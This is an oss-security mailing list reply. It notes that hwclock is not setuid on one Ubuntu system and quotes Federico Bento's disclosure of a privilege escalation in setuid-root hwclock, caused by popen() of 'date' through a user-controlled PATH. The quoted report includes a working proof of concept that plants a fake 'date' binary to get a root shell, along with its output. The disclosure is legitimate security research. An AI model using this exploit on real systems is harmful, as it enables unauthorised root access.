  oss-security - Re: hwclock(8) SUID privilege escalation            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Tue, 26 May From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Re: hwclock(8) SUID privilege escalation  Itâs not setuid root on my Ubuntu system.  larry@...p:~$ which hwclock /sbin/hwclock larry@...p:~$ ls -l /sbin/hwclock  -rwxr-xr-x 1 root root Feb 12 /sbin/hwclock larry@...p:~$ uname -a Linux meep #80-Ubuntu SMP Thu Mar 12 UTC GNU/Linux larry@...p:~$ cat /etc/issue Ubuntu LTS \n \l     > On May 26, at AM, wrote: >  > Hello, >  > During a recent assessment I have stumbled across a system which had > hwclock(8) setuid root >  > hwclock is a part of util-linux, all versions affected >  > $ man hwclock | sed -n >  > Users access and setuid >       Sometimes, you need to install hwclock setuid root. If you > want users other than the superuser to be able to display the clock > value using the direct ISA I/O >       method,  install  it setuid root. If you have the /dev/rtc > interface on your system or are on a non-ISA system, there's probably > no need for users to use the >       direct ISA I/O method, so don't bother. >  >       In any case, hwclock will not allow you to set anything unless > you have the superuser real uid.  (This  is  restriction  is  not > necessary  if  you  haven't >       installed setuid root, but it's there for now). >  > >  > "The program is designed to run setuid superuser, since we need to be able > to do direct I/O. (More to the point: we need permission to execute the > iopl() system call). (However, if you use one of the methods other than > direct ISA I/O to access the clock, no setuid is required)." >  > >  > "program is designed to run setuid (in some situations)" >  >  > Some comments in code and unfortunately also man page > advertising that setuid is no problem. That's pretty stupid promise. >  >  > from > >  >  > /* Quotes in date_opt would ruin the date command we construct. */ >        if (strchr(date_opt, '"') != NULL) { >                warnx(_ >                      ("The value of the --date option is not a valid date.\n" >                       "In particular, it contains quotation marks.")); >                return 12; >        } >  >        sprintf(date_command, "date --date=\"%s\" +seconds-into-epoch=%%s", >                date_opt); > 				[...] >  > 	date_child_fp = popen(date_command, "r"); >  > 				[...] >  > hwclock uses popen() to date_command which is 'date --date=\"%s\" > +seconds-into-epoch=%%s' >  > Exploiting is trivial, since $PATH is user-controlled >  >  >  > $ ls -l /usr/sbin/hwclock > -rwsr-sr-x. 1 root root Nov 27 /usr/sbin/hwclock > $ cat > date.c;gcc date.c -o date > main() > { > chown("/tmp/sploit", 0, 0); > chmod("/tmp/sploit", > } > ^D > $ cp /bin/sh /tmp/sploit > $ PATH=".:$PATH" /usr/sbin/hwclock --set > hwclock: The date command issued by hwclock returned unexpected results. > The command was: >  date +seconds-into-epoch=%s > The response was: >  > hwclock: No usable set-to time.  Cannot set clock. > $ /tmp/sploit > # id > euid=0(root) groups=0(root) >  >  > Can a CVE be assigned? >  >  > Notes: >  > Please note that this is possible on Debian-derived (and therefore Ubuntu), > because /bin/sh is provided by dash which does NOT make use > of privmode (does not drop privileges if ruid != euid, unlike bash), > which is a very stupid idea. >  > privmode is surprisingly effective at mitigating some common vulnerability > classes and misconfigurations, and it has been around since mid 90's. > Indeed, Chet Ramey (bash author and maintainer) explains that the > purpose of this is to prevent "bogus system(3)/popen(3) calls in > setuid executables" >  >  > TL;DR: When setuid root, hwclock relies on $PATH to popen() the date > command, meaning privilege escalation can occur since $PATH is > user-controlled. >  >  > Patches are available, signed off by Karel Zak <kzak@...hat.com> > >  > Initial bug report: > >  >  > Thanks, > Federico Bento. >  > ---------------------------------------------------------------- > This message was sent using IMP, the Internet Messaging Program. >    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      